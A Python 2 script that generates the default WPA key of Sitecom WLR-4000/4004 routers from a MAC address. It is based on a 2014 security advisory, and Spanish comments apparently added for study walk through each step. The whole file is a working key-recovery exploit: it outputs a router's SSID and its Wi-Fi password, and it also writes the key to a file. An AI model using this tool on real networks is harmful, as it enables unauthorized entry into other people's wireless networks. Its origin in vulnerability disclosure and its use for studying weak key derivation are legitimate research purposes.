# 
# Default WPA key generator for Sitecom WLR-4000/4004 routers
# ===========================================================
#
# Authors: 
#   Roberto Paleari     (@rpaleari)
#   Alessandro Di Pinto (@adipinto)
#
# Advisory URL:
#   http://blog.emaze.net/2014/04/sitecom-firmware-and-wifi.html
# 

import argparse
import os
import logging
import sys

# Charsets used for the generation of WPA key by different Sitecom models

#Se define un diccionario con dos claves: 4000 y 4004, cada una con sus tuplas

CHARSETS = {
    "4000": (
        "23456789ABCDEFGHJKLMNPQRSTUVWXYZ38BZ",
        "WXCDYNJU8VZABKL46PQ7RS9T2E5H3MFGPWR2"
    ),

    "4004": (
        "JKLMNPQRST23456789ABCDEFGHUVWXYZ38BK", 
        "E5MFJUWXCDKL46PQHAB3YNJ8VZ7RS9TR2GPW"
    ),
}

#se define la funcion que va a generar la clave, la misma que recibe como parametros la mac, el modelo y la longitud de la clave

def generateKey(mac, model, keylength = 12):
    global CHARSETS

#asset define opciones que deben cumplirse siempre y ayuda a encontrar bugs mas rapido
#siempre que sea TRUE assert no ahce nada, caso contrario dispara una excepcion

    assert model in CHARSETS

#a charset 1 le asigno el primer valor de la tupla correspondiente al modelo y a charset2 le asigno el segundo valor de la tupla (cadenas de texto)
  
    charset1, charset2 = CHARSETS[model]
    assert len(charset1) == len(charset2)

#recibo la mac, elimino los : y de hexadecimal le paso a ASCI
#en ASCCI uso 16 bits por caracter, por tanto obtengo 6 caracteres ASCII
#Estos caracteres no son imprimibles 

    mac = mac.replace(":", "").decode("hex")

#me aseguro que existan 6 caracteres ASCII

    assert len(mac) == 6

#tomo desde el caracter 2 en la cadena, es decir, desde el tercero (se numeran desde 0 --> 0 1 2 3) hasta el ultimo
#si la mac fuera aa:bb:cc:dd:ee:ff, estaria tomando solo cc:dd:ee:ff
#luego la vuelvo a poner en hexadecimal y de ahi lo convierto a entero

    val = int(mac[2:6].encode("hex"), 16)

#Defino 3 numeros hexadecimales que me ayudaran despues

#2551334231
    magic1 = 0x98124557
#274970
    magic2 = 0x0004321a
#2147483648
    magic3 = 0x80000000

#defino una lista vacia que luego la llenare

    offsets = []

#con range defino una lista con elementos desde 1 al 12

    for i in range(keylength):

#con & hago un and bit a bit del ultimo bit de val y otro bit

        if (val & 0x1) == 0:
# con ^ hago un xor
            val = val ^ magic2
# >>1 hace que se desplace un bit a la derecha
# esto hace que se elimine el bit menos significativo
            val = val >> 1
        else:
            val = val ^ magic1
            val = val >> 1
# | hace un or bit a bit
            val = val | magic3

# % hace una division y devuelve el residuo

        offset = val % len(charset1)

#con append lo que hago es poner el valor de offset al ultimo 
#de la lista offsets
#es decir, anado un elemento al final
#Asi se crea una lista  llamada offsets con los diferentes valores de offset

        offsets.append(offset)

#creo una cadena llamada wpakey

    wpakey = ""

# si tengo por ejemplo: offsets = [15, 20, 11, 33 ....] con offsets[0] obtengo el valor 15
# de ahi con charset1[offsets[0]] hago un charset1[15], y obtengo el caracter 16 (0, 1, 2, ..)
# de esta manera obtengo el primer caracter de la contrasena WPA

    wpakey += charset1[offsets[0]]

#Lazo for para completar los demas caracteres que faltan

    for i in range(0, keylength-1):

# Tomo los valores de los elementos i y i+1 del diccionario offsets
        
        magic3 = offsets[i]
        magic1 = offsets[i+1]

        if magic3 != magic1:
#aqui comparo los valores y de ser diferentes le asigno a magic3 el caracter de charset1 que corresponde a la posicion de magic1
            magic3 = charset1[magic1]
        else:
#en caso de que los valores sean iguales, le sumo i a magic 3 y hago una division para la longitud de charset 1
#aqui obtengo el residuo de la division, que sera un numero menor a 32 
            magic3 = (magic3 + i) % len(charset1)

#le asigno el caracter de charset2 correspondiente a la posicion magic3 

            magic3 = charset2[magic3]
            
#voy sumando los caraceres obtenidos para finalmente obtener la clave

        wpakey += magic3

    return wpakey
        
    archi=open('sitecom.txt','w')
    archi.close()




def main():
    global CHARSETS

    # Parse command-line arguments
    parser = argparse.ArgumentParser(formatter_class = 
                                     argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("-m", "--model", choices = CHARSETS.keys(),
                        required = True, help = "device model")
    parser.add_argument('mac', help = "MAC address")
    args = parser.parse_args()

    # Configure logging
    logging.basicConfig(format = '[%(asctime)s] %(levelname)s : %(message)s',
                        level = logging.DEBUG)

    # Generate SSID and WPA key
    ssid = "Sitecom%s" % args.mac.replace(":", "")[6:].upper()
    wpa = generateKey(args.mac, args.model)

    print "MAC:  %s" % args.mac
    print "SSID: %s" % ssid
    print "WPA:  %s" % wpa

    archi=open('sitecom.txt','w')
    archi.write("%s" %wpa)
    archi.close()
    
if __name__ == "__main__":
    main()



